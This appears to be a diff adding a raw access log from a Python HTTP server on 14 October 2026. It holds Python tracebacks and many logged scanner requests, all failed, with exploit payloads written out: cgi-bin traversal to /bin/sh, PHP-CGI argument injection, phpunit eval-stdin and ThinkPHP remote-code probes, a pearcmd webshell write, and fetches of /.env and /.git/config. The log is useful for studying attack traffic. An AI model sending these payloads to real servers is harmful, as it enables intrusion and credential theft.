@@ -1,0 +1,451 @@
+nohup: ignoring input
+45.105.114.68 - - [14/Oct/2026 02:02:52] "GET / HTTP/1.1" 200 -
+45.105.114.68 - - [14/Oct/2026 02:02:53] code 404, message File not found
+45.105.114.68 - - [14/Oct/2026 02:02:53] "GET /favicon.ico HTTP/1.1" 404 -
+57.141.20.3 - - [14/Oct/2026 02:03:58] "GET /?fbclid=IwZXh0bgNhZW0CMTEAcGRvZgRzcnRjBmFwcF9pZAwyNTYyODEwNDA1NTgAAR75J3canqSHuYABTE-JhrX-nukp46MALQyOrruhWuI0cchhmga9ayPOfL1RlQ_aem_6yLvYrMFV8XLVs0AvuZs7g HTTP/1.1" 200 -
+69.63.184.9 - - [14/Oct/2026 02:03:58] "GET / HTTP/1.1" 200 -
+173.252.95.54 - - [14/Oct/2026 02:03:59] "GET / HTTP/1.1" 200 -
+57.141.20.47 - - [14/Oct/2026 02:03:59] code 404, message File not found
+57.141.20.47 - - [14/Oct/2026 02:03:59] "GET /favicon.ico HTTP/1.1" 404 -
+45.105.114.68 - - [14/Oct/2026 02:06:26] "GET / HTTP/1.1" 200 -
+45.105.114.68 - - [14/Oct/2026 02:06:27] code 404, message File not found
+45.105.114.68 - - [14/Oct/2026 02:06:27] "GET /favicon.ico HTTP/1.1" 404 -
+130.12.180.32 - - [14/Oct/2026 02:42:38] code 404, message File not found
+130.12.180.32 - - [14/Oct/2026 02:42:38] "GET /phpmyadmin/scripts/setup.php HTTP/1.1" 404 -
+130.12.180.32 - - [14/Oct/2026 02:43:27] code 501, message Unsupported method ('POST')
+130.12.180.32 - - [14/Oct/2026 02:43:27] "POST /scripts/setup.php HTTP/1.1" 501 -
+130.94.24.42 - - [14/Oct/2026 02:46:58] "GET / HTTP/1.0" 200 -
+----------------------------------------
+Exception occurred during processing of request from ('130.94.24.42', 37936)
+Traceback (most recent call last):
+  File "/usr/lib/python3.12/socketserver.py", line 692, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.12/http/server.py", line 1311, in finish_request
+    self.RequestHandlerClass(request, client_address, self,
+  File "/usr/lib/python3.12/http/server.py", line 672, in __init__
+    super().__init__(*args, **kwargs)
+  File "/usr/lib/python3.12/socketserver.py", line 761, in __init__
+    self.handle()
+  File "/usr/lib/python3.12/http/server.py", line 436, in handle
+    self.handle_one_request()
+  File "/usr/lib/python3.12/http/server.py", line 424, in handle_one_request
+    method()
+  File "/usr/lib/python3.12/http/server.py", line 679, in do_GET
+    self.copyfile(f, self.wfile)
+  File "/usr/lib/python3.12/http/server.py", line 878, in copyfile
+    shutil.copyfileobj(source, outputfile)
+  File "/usr/lib/python3.12/shutil.py", line 204, in copyfileobj
+    fdst_write(buf)
+  File "/usr/lib/python3.12/socketserver.py", line 840, in write
+    self._sock.sendall(b)
+BrokenPipeError: [Errno 32] Broken pipe
+----------------------------------------
+176.32.193.16 - - [14/Oct/2026 02:52:22] code 400, message Bad request version ("¯nãY»bhlÿ(=':©\\x82ÙoÈ¢×\\x93\\x98´ï\\x80å¹\\x90\\x00(À")
+176.32.193.16 - - [14/Oct/2026 02:52:22] "\x16\x03\x02\x01o\x01\x00\x01k\x03\x02RHÅ\x1a#÷:Nßâ´\x82/ÿ\x09T\x9f§Äy°hÆ\x13\x8c¤\x1c="á\x1a\x98 \x84´,\x85¯nãY»bhlÿ(=':©\x82ÙoÈ¢×\x93\x98´ï\x80å¹\x90\x00(À" 400 -
+45.198.224.125 - - [14/Oct/2026 02:55:02] "GET / HTTP/1.1" 200 -
+----------------------------------------
+Exception occurred during processing of request from ('45.198.224.125', 40466)
+Traceback (most recent call last):
+  File "/usr/lib/python3.12/socketserver.py", line 692, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.12/http/server.py", line 1311, in finish_request
+    self.RequestHandlerClass(request, client_address, self,
+  File "/usr/lib/python3.12/http/server.py", line 672, in __init__
+    super().__init__(*args, **kwargs)
+  File "/usr/lib/python3.12/socketserver.py", line 761, in __init__
+    self.handle()
+  File "/usr/lib/python3.12/http/server.py", line 436, in handle
+    self.handle_one_request()
+  File "/usr/lib/python3.12/http/server.py", line 424, in handle_one_request
+    method()
+  File "/usr/lib/python3.12/http/server.py", line 679, in do_GET
+    self.copyfile(f, self.wfile)
+  File "/usr/lib/python3.12/http/server.py", line 878, in copyfile
+    shutil.copyfileobj(source, outputfile)
+  File "/usr/lib/python3.12/shutil.py", line 204, in copyfileobj
+    fdst_write(buf)
+  File "/usr/lib/python3.12/socketserver.py", line 840, in write
+    self._sock.sendall(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+----------------------------------------
+45.198.224.124 - - [14/Oct/2026 03:13:10] "GET / HTTP/1.1" 200 -
+95.234.167.123 - - [14/Oct/2026 03:25:23] code 501, message Unsupported method ('POST')
+95.234.167.123 - - [14/Oct/2026 03:25:23] "POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1" 501 -
+95.234.167.123 - - [14/Oct/2026 03:25:25] code 501, message Unsupported method ('POST')
+95.234.167.123 - - [14/Oct/2026 03:25:25] "POST /cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh HTTP/1.1" 501 -
+95.234.167.123 - - [14/Oct/2026 03:25:26] code 501, message Unsupported method ('POST')
+95.234.167.123 - - [14/Oct/2026 03:25:26] "POST /hello.world?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input HTTP/1.1" 501 -
+95.234.167.123 - - [14/Oct/2026 03:25:27] code 501, message Unsupported method ('POST')
+95.234.167.123 - - [14/Oct/2026 03:25:27] "POST /?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input HTTP/1.1" 501 -
+95.234.167.123 - - [14/Oct/2026 03:25:28] code 501, message Unsupported method ('POST')
+95.234.167.123 - - [14/Oct/2026 03:25:28] "POST /index.php?%25ADd+allow_url_include%3D1+%25ADd+auto_prepend_file%3Dphp://input HTTP/1.1" 501 -
+95.234.167.123 - - [14/Oct/2026 03:25:30] code 501, message Unsupported method ('POST')
+95.234.167.123 - - [14/Oct/2026 03:25:30] "POST /test.hello?%25ADd+allow_url_include%3D1+%25ADd+auto_prepend_file%3Dphp://input HTTP/1.1" 501 -
+95.234.167.123 - - [14/Oct/2026 03:25:31] code 501, message Unsupported method ('POST')
+95.234.167.123 - - [14/Oct/2026 03:25:31] "POST /index.php?-d+allow_url_include%3don+-d+auto_prepend_file%3dphp%3a//input HTTP/1.1" 501 -
+95.234.167.123 - - [14/Oct/2026 03:25:32] code 404, message File not found
+95.234.167.123 - - [14/Oct/2026 03:25:32] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 -
+95.234.167.123 - - [14/Oct/2026 03:25:33] code 404, message File not found
+95.234.167.123 - - [14/Oct/2026 03:25:33] "GET /vendor/phpunit/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 404 -
+95.234.167.123 - - [14/Oct/2026 03:25:35] code 404, message File not found
+95.234.167.123 - - [14/Oct/2026 03:25:35] "GET /vendor/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 -
+95.234.167.123 - - [14/Oct/2026 03:25:36] code 404, message File not found
+95.234.167.123 - - [14/Oct/2026 03:25:36] "GET /vendor/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 404 -
+95.234.167.123 - - [14/Oct/2026 03:25:38] code 404, message File not found
+95.234.167.123 - - [14/Oct/2026 03:25:38] "GET /vendor/phpunit/phpunit/LICENSE/eval-stdin.php HTTP/1.1" 404 -
+95.234.167.123 - - [14/Oct/2026 03:25:40] code 404, message File not found
+95.234.167.123 - - [14/Oct/2026 03:25:40] "GET /vendor/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 -
+95.234.167.123 - - [14/Oct/2026 03:25:41] code 404, message File not found
+95.234.167.123 - - [14/Oct/2026 03:25:41] "GET /phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 -
+95.234.167.123 - - [14/Oct/2026 03:25:43] code 404, message File not found
+95.234.167.123 - - [14/Oct/2026 03:25:43] "GET /phpunit/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 404 -
+95.234.167.123 - - [14/Oct/2026 03:25:45] code 404, message File not found
+95.234.167.123 - - [14/Oct/2026 03:25:45] "GET /phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 -
+95.234.167.123 - - [14/Oct/2026 03:25:47] code 404, message File not found
+95.234.167.123 - - [14/Oct/2026 03:25:47] "GET /phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 404 -
+95.234.167.123 - - [14/Oct/2026 03:25:49] code 404, message File not found
+95.234.167.123 - - [14/Oct/2026 03:25:49] "GET /lib/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 -
+95.234.167.123 - - [14/Oct/2026 03:25:51] code 404, message File not found
+95.234.167.123 - - [14/Oct/2026 03:25:51] "GET /lib/phpunit/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 404 -
+95.234.167.123 - - [14/Oct/2026 03:25:54] code 404, message File not found
+95.234.167.123 - - [14/Oct/2026 03:25:54] "GET /lib/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 -
+95.234.167.123 - - [14/Oct/2026 03:25:57] code 404, message File not found
+95.234.167.123 - - [14/Oct/2026 03:25:57] "GET /lib/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 404 -
+95.234.167.123 - - [14/Oct/2026 03:25:59] code 404, message File not found
+95.234.167.123 - - [14/Oct/2026 03:25:59] "GET /lib/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 -
+95.234.167.123 - - [14/Oct/2026 03:26:03] code 404, message File not found
+95.234.167.123 - - [14/Oct/2026 03:26:03] "GET /laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 -
+95.234.167.123 - - [14/Oct/2026 03:26:06] code 404, message File not found
+95.234.167.123 - - [14/Oct/2026 03:26:06] "GET /www/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 -
+95.234.167.123 - - [14/Oct/2026 03:26:08] code 404, message File not found
+95.234.167.123 - - [14/Oct/2026 03:26:08] "GET /ws/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 -
+95.234.167.123 - - [14/Oct/2026 03:26:09] code 404, message File not found
+95.234.167.123 - - [14/Oct/2026 03:26:09] "GET /yii/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 -
+95.234.167.123 - - [14/Oct/2026 03:26:11] code 404, message File not found
+95.234.167.123 - - [14/Oct/2026 03:26:11] "GET /zend/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 -
+95.234.167.123 - - [14/Oct/2026 03:26:12] code 404, message File not found
+95.234.167.123 - - [14/Oct/2026 03:26:12] "GET /ws/ec/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 -
+95.234.167.123 - - [14/Oct/2026 03:26:14] code 404, message File not found
+95.234.167.123 - - [14/Oct/2026 03:26:14] "GET /V2/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 -
+95.234.167.123 - - [14/Oct/2026 03:26:15] code 404, message File not found
+95.234.167.123 - - [14/Oct/2026 03:26:15] "GET /tests/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 -
+95.234.167.123 - - [14/Oct/2026 03:26:17] code 404, message File not found
+95.234.167.123 - - [14/Oct/2026 03:26:17] "GET /test/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 -
+95.234.167.123 - - [14/Oct/2026 03:26:18] code 404, message File not found
+95.234.167.123 - - [14/Oct/2026 03:26:18] "GET /testing/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 -
+95.234.167.123 - - [14/Oct/2026 03:26:20] code 404, message File not found
+95.234.167.123 - - [14/Oct/2026 03:26:20] "GET /api/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 -
+95.234.167.123 - - [14/Oct/2026 03:26:21] code 404, message File not found
+95.234.167.123 - - [14/Oct/2026 03:26:21] "GET /demo/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 -
+95.234.167.123 - - [14/Oct/2026 03:26:23] code 404, message File not found
+95.234.167.123 - - [14/Oct/2026 03:26:23] "GET /cms/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 -
+95.234.167.123 - - [14/Oct/2026 03:26:25] code 404, message File not found
+95.234.167.123 - - [14/Oct/2026 03:26:25] "GET /crm/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 -
+95.234.167.123 - - [14/Oct/2026 03:26:27] code 404, message File not found
+95.234.167.123 - - [14/Oct/2026 03:26:27] "GET /admin/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 -
+95.234.167.123 - - [14/Oct/2026 03:26:29] code 404, message File not found
+95.234.167.123 - - [14/Oct/2026 03:26:29] "GET /backup/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 -
+95.234.167.123 - - [14/Oct/2026 03:26:31] code 404, message File not found
+95.234.167.123 - - [14/Oct/2026 03:26:31] "GET /blog/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 -
+95.234.167.123 - - [14/Oct/2026 03:26:33] code 404, message File not found
+95.234.167.123 - - [14/Oct/2026 03:26:33] "GET /workspace/drupal/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 -
+95.234.167.123 - - [14/Oct/2026 03:26:36] code 404, message File not found
+95.234.167.123 - - [14/Oct/2026 03:26:36] "GET /panel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 -
+95.234.167.123 - - [14/Oct/2026 03:26:38] code 404, message File not found
+95.234.167.123 - - [14/Oct/2026 03:26:38] "GET /public/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 -
+95.234.167.123 - - [14/Oct/2026 03:26:40] code 404, message File not found
+95.234.167.123 - - [14/Oct/2026 03:26:40] "GET /apps/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 -
+95.234.167.123 - - [14/Oct/2026 03:26:44] code 404, message File not found
+95.234.167.123 - - [14/Oct/2026 03:26:44] "GET /app/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 -
+95.234.167.123 - - [14/Oct/2026 03:26:47] code 404, message File not found
+95.234.167.123 - - [14/Oct/2026 03:26:47] "GET /index.php?s=/index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=Hello HTTP/1.1" 404 -
+95.234.167.123 - - [14/Oct/2026 03:26:49] code 404, message File not found
+95.234.167.123 - - [14/Oct/2026 03:26:49] "GET /public/index.php?s=/index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=Hello HTTP/1.1" 404 -
+95.234.167.123 - - [14/Oct/2026 03:26:52] code 404, message File not found
+95.234.167.123 - - [14/Oct/2026 03:26:52] "GET /index.php?lang=../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/&/<?echo(md5("hi"));?>+/tmp/index1.php HTTP/1.1" 404 -
+95.234.167.123 - - [14/Oct/2026 03:26:53] code 404, message File not found
+95.234.167.123 - - [14/Oct/2026 03:26:53] "GET /index.php?lang=../../../../../../../../tmp/index1 HTTP/1.1" 404 -
+95.234.167.123 - - [14/Oct/2026 03:26:55] code 404, message File not found
+95.234.167.123 - - [14/Oct/2026 03:26:55] "GET /containers/json HTTP/1.1" 404 -
+66.132.172.101 - - [14/Oct/2026 03:33:41] code 400, message Bad request version ('À\\x14À')
+66.132.172.101 - - [14/Oct/2026 03:33:41] "\x16\x03\x01\x05º\x01\x00\x05¶\x03\x03®\x89vzL$\x97\x12u\x8c\x9d:Ç¬\x04¯êI4{`6\x04b~p9Ñ»nDD f^)\x96Ò\x07§üà\x8foØÕrßþGð\x0c,-Îä\x9fÔ\x16ï)¦_K\x0d\x00&Ì¨Ì©À/À0À+À,À\x13À\x09À\x14À" 400 -
+66.132.172.101 - - [14/Oct/2026 03:33:55] "GET / HTTP/1.1" 200 -
+66.132.172.101 - - [14/Oct/2026 03:33:56] code 505, message Invalid HTTP version (2.0)
+66.132.172.101 - - [14/Oct/2026 03:33:56] "PRI * HTTP/2.0" 505 -
+66.132.172.101 - - [14/Oct/2026 03:33:57] code 404, message File not found
+66.132.172.101 - - [14/Oct/2026 03:33:57] "GET /favicon.ico HTTP/1.1" 404 -
+66.132.172.101 - - [14/Oct/2026 03:34:13] code 400, message Bad request syntax ('\\x16\\x03\\x01\\x05º\\x01\\x00\\x05¶\\x03\\x03\\x19\\x94wþä¡}Ô\\x86Ø\\x7f>ë\\x9f')
+66.132.172.101 - - [14/Oct/2026 03:34:13] "\x16\x03\x01\x05º\x01\x00\x05¶\x03\x03\x19\x94wþä¡}Ô\x86Ø\x7f>ë\x9f" 400 -
+66.132.172.101 - - [14/Oct/2026 03:34:16] code 404, message File not found
+66.132.172.101 - - [14/Oct/2026 03:34:16] "GET /ai/site-profile.json HTTP/1.1" 404 -
+91.230.168.193 - - [14/Oct/2026 04:09:05] code 400, message Bad request version ('À#À¬À®À+À')
+91.230.168.193 - - [14/Oct/2026 04:09:05] "\x16\x03\x03\x02c\x01\x00\x02_\x03\x034\x87ª{¼l1/Ðÿ22i\x936\x1cnË­\x00Ãæ,ÄÚ\x04'ó*þ3\x19 \x1doÛ.\x8d}Ùí\x10Ó\x8dî\x08}\x0fÚ»\x10\x1a\x03ó#°þ±¸â²·Áw¬\x00\x8a\x00\x16\x003\x00gÀ\x9eÀ¢\x00\x9e\x009\x00kÀ\x9fÀ£\x00\x9f\x00E\x00¾\x00\x88\x00Ä\x00\x9aÀ\x08À\x09À#À¬À®À+À" 400 -
+91.230.168.245 - - [14/Oct/2026 04:09:09] "GET / HTTP/1.1" 200 -
+195.184.76.223 - - [14/Oct/2026 04:13:15] code 404, message File not found
+195.184.76.223 - - [14/Oct/2026 04:13:15] "GET /favicon.ico HTTP/1.1" 404 -
+160.119.76.158 - - [14/Oct/2026 04:16:40] "GET / HTTP/1.1" 200 -
+159.203.8.243 - - [14/Oct/2026 04:39:04] "GET / HTTP/1.1" 200 -
+159.203.8.243 - - [14/Oct/2026 04:39:05] code 404, message File not found
+159.203.8.243 - - [14/Oct/2026 04:39:05] "GET /favicon.ico HTTP/1.1" 404 -
+204.76.203.219 - - [14/Oct/2026 04:54:12] "GET / HTTP/1.1" 200 -
+172.239.158.26 - - [14/Oct/2026 04:56:25] code 404, message File not found
+172.239.158.26 - - [14/Oct/2026 04:56:25] "GET /.env HTTP/1.1" 404 -
+172.239.158.26 - - [14/Oct/2026 04:56:25] code 404, message File not found
+172.239.158.26 - - [14/Oct/2026 04:56:25] "GET /.git/config HTTP/1.1" 404 -
+54.146.178.176 - - [14/Oct/2026 05:08:21] "GET / HTTP/1.1" 200 -
+195.182.16.23 - - [14/Oct/2026 05:12:56] code 404, message File not found
+195.182.16.23 - - [14/Oct/2026 05:12:56] "GET /SDK/webLanguage HTTP/1.1" 404 -
+65.49.20.68 - - [14/Oct/2026 05:36:02] "GET / HTTP/1.1" 200 -
+----------------------------------------
+Exception occurred during processing of request from ('65.49.20.68', 64602)
+Traceback (most recent call last):
+  File "/usr/lib/python3.12/socketserver.py", line 692, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.12/http/server.py", line 1311, in finish_request
+    self.RequestHandlerClass(request, client_address, self,
+  File "/usr/lib/python3.12/http/server.py", line 672, in __init__
+    super().__init__(*args, **kwargs)
+  File "/usr/lib/python3.12/socketserver.py", line 761, in __init__
+    self.handle()
+  File "/usr/lib/python3.12/http/server.py", line 436, in handle
+    self.handle_one_request()
+  File "/usr/lib/python3.12/http/server.py", line 424, in handle_one_request
+    method()
+  File "/usr/lib/python3.12/http/server.py", line 679, in do_GET
+    self.copyfile(f, self.wfile)
+  File "/usr/lib/python3.12/http/server.py", line 878, in copyfile
+    shutil.copyfileobj(source, outputfile)
+  File "/usr/lib/python3.12/shutil.py", line 204, in copyfileobj
+    fdst_write(buf)
+  File "/usr/lib/python3.12/socketserver.py", line 840, in write
+    self._sock.sendall(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+----------------------------------------
+65.49.20.68 - - [14/Oct/2026 05:40:08] code 404, message File not found
+65.49.20.68 - - [14/Oct/2026 05:40:08] "GET /favicon.ico HTTP/1.1" 404 -
+65.49.20.68 - - [14/Oct/2026 05:41:03] code 404, message File not found
+65.49.20.68 - - [14/Oct/2026 05:41:03] "GET /geoserver/web/ HTTP/1.1" 404 -
+45.198.224.125 - - [14/Oct/2026 05:49:25] "GET / HTTP/1.1" 200 -
+----------------------------------------
+Exception occurred during processing of request from ('45.198.224.125', 48840)
+Traceback (most recent call last):
+  File "/usr/lib/python3.12/socketserver.py", line 692, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.12/http/server.py", line 1311, in finish_request
+    self.RequestHandlerClass(request, client_address, self,
+  File "/usr/lib/python3.12/http/server.py", line 672, in __init__
+    super().__init__(*args, **kwargs)
+  File "/usr/lib/python3.12/socketserver.py", line 761, in __init__
+    self.handle()
+  File "/usr/lib/python3.12/http/server.py", line 436, in handle
+    self.handle_one_request()
+  File "/usr/lib/python3.12/http/server.py", line 424, in handle_one_request
+    method()
+  File "/usr/lib/python3.12/http/server.py", line 679, in do_GET
+    self.copyfile(f, self.wfile)
+  File "/usr/lib/python3.12/http/server.py", line 878, in copyfile
+    shutil.copyfileobj(source, outputfile)
+  File "/usr/lib/python3.12/shutil.py", line 204, in copyfileobj
+    fdst_write(buf)
+  File "/usr/lib/python3.12/socketserver.py", line 840, in write
+    self._sock.sendall(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+----------------------------------------
+45.198.224.124 - - [14/Oct/2026 05:52:08] "GET / HTTP/1.1" 200 -
+178.62.220.157 - - [14/Oct/2026 05:53:45] "GET / HTTP/1.1" 200 -
+178.62.220.157 - - [14/Oct/2026 05:53:45] code 404, message File not found
+178.62.220.157 - - [14/Oct/2026 05:53:45] "GET /favicon.ico HTTP/1.1" 404 -
+192.248.150.180 - - [14/Oct/2026 06:13:09] "GET / HTTP/1.1" 200 -
+----------------------------------------
+Exception occurred during processing of request from ('192.248.150.180', 40236)
+Traceback (most recent call last):
+  File "/usr/lib/python3.12/socketserver.py", line 692, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.12/http/server.py", line 1311, in finish_request
+    self.RequestHandlerClass(request, client_address, self,
+  File "/usr/lib/python3.12/http/server.py", line 672, in __init__
+    super().__init__(*args, **kwargs)
+  File "/usr/lib/python3.12/socketserver.py", line 761, in __init__
+    self.handle()
+  File "/usr/lib/python3.12/http/server.py", line 436, in handle
+    self.handle_one_request()
+  File "/usr/lib/python3.12/http/server.py", line 424, in handle_one_request
+    method()
+  File "/usr/lib/python3.12/http/server.py", line 679, in do_GET
+    self.copyfile(f, self.wfile)
+  File "/usr/lib/python3.12/http/server.py", line 878, in copyfile
+    shutil.copyfileobj(source, outputfile)
+  File "/usr/lib/python3.12/shutil.py", line 204, in copyfileobj
+    fdst_write(buf)
+  File "/usr/lib/python3.12/socketserver.py", line 840, in write
+    self._sock.sendall(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+----------------------------------------
+45.198.224.60 - - [14/Oct/2026 06:27:06] "GET / HTTP/1.1" 200 -
+205.210.31.228 - - [14/Oct/2026 06:29:15] "GET / HTTP/1.0" 200 -
+----------------------------------------
+Exception occurred during processing of request from ('205.210.31.228', 51504)
+Traceback (most recent call last):
+  File "/usr/lib/python3.12/socketserver.py", line 692, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.12/http/server.py", line 1311, in finish_request
+    self.RequestHandlerClass(request, client_address, self,
+  File "/usr/lib/python3.12/http/server.py", line 672, in __init__
+    super().__init__(*args, **kwargs)
+  File "/usr/lib/python3.12/socketserver.py", line 761, in __init__
+    self.handle()
+  File "/usr/lib/python3.12/http/server.py", line 436, in handle
+    self.handle_one_request()
+  File "/usr/lib/python3.12/http/server.py", line 424, in handle_one_request
+    method()
+  File "/usr/lib/python3.12/http/server.py", line 679, in do_GET
+    self.copyfile(f, self.wfile)
+  File "/usr/lib/python3.12/http/server.py", line 878, in copyfile
+    shutil.copyfileobj(source, outputfile)
+  File "/usr/lib/python3.12/shutil.py", line 204, in copyfileobj
+    fdst_write(buf)
+  File "/usr/lib/python3.12/socketserver.py", line 840, in write
+    self._sock.sendall(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+----------------------------------------
+216.218.206.69 - - [14/Oct/2026 06:56:13] code 400, message Bad HTTP/0.9 request type ("\\x16\\x03\\x01\\x00{\\x01\\x00\\x00w\\x03\\x03ì\\x99\\x9eÏ\\x9fEP.sàwà\\x12u1ç\\x97Æ\\x00éß3.\\x8f'A\\x0eÚ\\x8dß3÷\\x00\\x00\\x1aÀ/À+À\\x11À\\x07À\\x13À")
+216.218.206.69 - - [14/Oct/2026 06:56:13] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x03ì\x99\x9eÏ\x9fEP.sàwà\x12u1ç\x97Æ\x00éß3.\x8f'A\x0eÚ\x8dß3÷\x00\x00\x1aÀ/À+À\x11À\x07À\x13À\x09À\x14À" 400 -
+85.217.149.18 - - [14/Oct/2026 06:58:08] "GET / HTTP/1.1" 200 -
+85.217.149.18 - - [14/Oct/2026 06:58:08] code 404, message File not found
+85.217.149.18 - - [14/Oct/2026 06:58:08] "GET /favicon.ico HTTP/1.1" 404 -
+66.132.172.139 - - [14/Oct/2026 07:13:26] code 400, message Bad request version ('À\\x14À')
+66.132.172.139 - - [14/Oct/2026 07:13:26] "\x16\x03\x01\x05º\x01\x00\x05¶\x03\x03\x02\x7fM\x91á\x14%\x1dkWä¶Ü$\x7f\x8c6]\x93\x10ª\x88\x93À§\x87\x9eä\x19.õX ÿ\x16\x9aûÙ\x8aqËsÄG\x1b|G\x7f\x0f0\x13\x91ï}ç54\x0f³ëy.Aåô\x00&Ì¨Ì©À/À0À+À,À\x13À\x09À\x14À" 400 -
+66.132.172.139 - - [14/Oct/2026 07:13:26] "GET / HTTP/1.1" 200 -
+66.132.172.139 - - [14/Oct/2026 07:13:28] code 505, message Invalid HTTP version (2.0)
+66.132.172.139 - - [14/Oct/2026 07:13:28] "PRI * HTTP/2.0" 505 -
+66.132.172.139 - - [14/Oct/2026 07:13:28] code 404, message File not found
+66.132.172.139 - - [14/Oct/2026 07:13:28] "GET /favicon.ico HTTP/1.1" 404 -
+66.132.172.139 - - [14/Oct/2026 07:13:33] code 400, message Bad request version ('À\\x14À')
+66.132.172.139 - - [14/Oct/2026 07:13:33] "\x16\x03\x01\x05º\x01\x00\x05¶\x03\x03%µâÑ\x07¢$DÐênCØåw\x87k¼@$Ä¡WVÉ#ÐOÌ\x0bH\x8d º60Ð¯\x1fc]\x14êê:\x802ÐæùÈª\x00E\x1eÒ Éø×öu1<k\x00&Ì¨Ì©À/À0À+À,À\x13À\x09À\x14À" 400 -
+66.132.172.139 - - [14/Oct/2026 07:13:33] code 404, message File not found
+66.132.172.139 - - [14/Oct/2026 07:13:33] "GET /ai/site-profile.json HTTP/1.1" 404 -
+43.133.69.37 - - [14/Oct/2026 07:23:30] "GET / HTTP/1.1" 200 -
+45.198.224.124 - - [14/Oct/2026 07:32:38] "GET / HTTP/1.1" 200 -
+85.217.149.13 - - [14/Oct/2026 08:02:29] code 400, message Bad request version ('À\\x14À')
+85.217.149.13 - - [14/Oct/2026 08:02:29] "\x16\x03\x01\x00î\x01\x00\x00ê\x03\x03p\x83Ô-ÛI8\x9a,\x02±:\x8f\x19\x11\x11\x1a¾Z\x06\x97ø[Ï©à\x0e]\x0d\x9cV; \x8aþäW3}×ÙNÓZx­1,Üù­\x8a±\x83îæ°8M\x92ê\x99\x89¯Õ\x00&Ì¨Ì©À/À0À+À,À\x13À\x09À\x14À" 400 -
+45.198.224.125 - - [14/Oct/2026 08:41:41] "GET / HTTP/1.1" 200 -
+----------------------------------------
+Exception occurred during processing of request from ('45.198.224.125', 50260)
+Traceback (most recent call last):
+  File "/usr/lib/python3.12/socketserver.py", line 692, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.12/http/server.py", line 1311, in finish_request
+    self.RequestHandlerClass(request, client_address, self,
+  File "/usr/lib/python3.12/http/server.py", line 672, in __init__
+    super().__init__(*args, **kwargs)
+  File "/usr/lib/python3.12/socketserver.py", line 761, in __init__
+    self.handle()
+  File "/usr/lib/python3.12/http/server.py", line 436, in handle
+    self.handle_one_request()
+  File "/usr/lib/python3.12/http/server.py", line 424, in handle_one_request
+    method()
+  File "/usr/lib/python3.12/http/server.py", line 679, in do_GET
+    self.copyfile(f, self.wfile)
+  File "/usr/lib/python3.12/http/server.py", line 878, in copyfile
+    shutil.copyfileobj(source, outputfile)
+  File "/usr/lib/python3.12/shutil.py", line 204, in copyfileobj
+    fdst_write(buf)
+  File "/usr/lib/python3.12/socketserver.py", line 840, in write
+    self._sock.sendall(b)
+BrokenPipeError: [Errno 32] Broken pipe
